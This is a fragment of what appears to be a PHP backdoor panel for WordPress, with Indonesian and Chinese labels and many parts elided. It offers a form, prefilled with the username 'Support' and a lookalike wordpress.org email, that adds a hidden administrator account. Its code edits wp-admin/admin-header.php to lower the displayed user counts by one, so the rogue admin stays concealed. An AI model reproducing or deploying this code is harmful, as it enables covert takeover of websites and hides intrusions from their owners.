...
if($user_name != '' && $pwd != '' && $email != ''){    
    ...
    if(mysqli_num_rows($check) > 0){
         $notice = 'This Username or Email has already been used。';
        ...
        $path = ABSPATH.'wp-admin/admin-header.php';
         ...
         if(file_exists($path)){
            ...
            if(strstr($temp, 'number_format_i18n( $total_users-1') && (strstr($temp, 'number_format_i18n( $avail_roles[ $this_role ]-1') || strstr($temp, 'number_format_i18n( $avail_roles[$this_role]-1')) ){
               ...
               fwrite($fp, $temp);
               fclose($fp);
                 $notice .= ' Sembunyikan file OK.';                
             }
         }else{
             $notice .= ' Sembunyikan File Gagal.';
        }
   }
...
<table class="table">
  ...
  <tr>
    <td colspan="5" align="left">【 Tambahkan admin 】</td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form">Username：<input type="text" value="Support" name="user_name"> Pass：<input type="text" value="vFELLmUMgJJdQW4S" name="pwd"> Email：<input type="text" value="support@wordpress.org" name="email"> <input type="submit"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left"><form action="" method="post" name="form"><input type='hidden' name="action" value='del'><input type="submit" value="Hapus"></form></td>
  </tr>
  <tr>
    <td colspan="5" align="left">【 User List：<?php echo $total;?>位 】</td>
  </tr>
  <?php if($total > 0){?>
  <tr>
    <td>ID</td>
